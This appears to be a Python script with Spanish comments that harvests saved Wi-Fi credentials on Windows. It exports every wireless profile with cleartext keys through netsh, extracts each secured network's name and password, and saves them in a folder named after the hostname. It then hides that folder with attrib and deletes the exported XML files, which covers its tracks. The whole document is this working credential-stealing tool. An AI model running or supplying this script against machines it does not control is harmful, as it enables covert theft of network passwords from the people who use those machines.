import subprocess


class ManipulateSo:
    def __init__(self):
        pass

    @classmethod
    def executeCommand(self, command):
        return subprocess.check_output(command, shell=True).decode('utf-8').split('\n')

    @classmethod
    def captureAllxmlFilesWifi(self):
        xmlFiles = []
        for file in os.listdir():
            if file.startswith("Wi-Fi-") and file.endswith(".xml"):
                xmlFiles.append(file)
        return xmlFiles

    @classmethod
    def getWifiList(cls, xmlFiles):
        wifiPW = []

        for file in xmlFiles:
            try:
                fileXml = open(file, "r").read()
            except Exception as e:
                print(e)

            authentication = fileXml.split("<authentication>")[
                1].split("</authentication>")[0]

            if authentication != 'open':

                nameWifi = fileXml.split("<name>")[1].split("</name>")[0]
                passwordWifi = fileXml.split("<keyMaterial>")[
                    1].split("</keyMaterial>")[0]

                wifiPW.append({
                    "name": nameWifi,
                    "password": passwordWifi,
                    "authentication": authentication
                })

        return wifiPW

    @classmethod
    def createFolderWP(cls, wifiList, dirSaveWifi, hostName):
        for wifi in wifiList:
            file = open(f"{dirSaveWifi}/{hostName}/{wifi['name']}.txt", "w")
            file.write(f" NAME = {wifi['name']}\n")
            file.write(f" PASSWORD = {wifi['password']}\n")
            file.write(f" AUTHENTICATION {wifi['authentication']}\n")
            file.close()


if __name__ == "__main__":
    import errno
    import os

    dirSaveWifi = "./wifi-pw"

    try:
        os.makedirs(dirSaveWifi)
    except OSError as e:
        if e.errno != errno.EEXIST:
            raise

    # Ejecuta los comandos para exportar la lista de redes wifi
    ManipulateSo.executeCommand(
        ["netsh", "wlan", "export", "profile", "key=clear"])

    # Se capturan todos los archivos xml

    xmlFiles = ManipulateSo.captureAllxmlFilesWifi()

    # Se obtiene la lista de redes wifi sin la sintaxis xml
    wifiList = ManipulateSo.getWifiList(xmlFiles)

    # Crea una carpeta con el nomnbre del hostname y guardar los txt con los datos de las redes wifi
    try:
        '''
            Obtiene el nombre del equipo y usa el nombre
            como nombre de la carpeta
        '''
        hostName = ManipulateSo.executeCommand(["hostname"])[0].split()[0]
        os.makedirs(dirSaveWifi + "/" + hostName)
        ManipulateSo.createFolderWP(wifiList, dirSaveWifi, hostName)

        ManipulateSo.executeCommand(
            ["attrib", "+h", f"{dirSaveWifi}"])

    except OSError as e:
        if e.errno != errno.EEXIST:
            raise

    # Se eliminan los archivos de exportacion xml
    for file in xmlFiles:
        if os.path.isfile(file):
            os.remove(file)
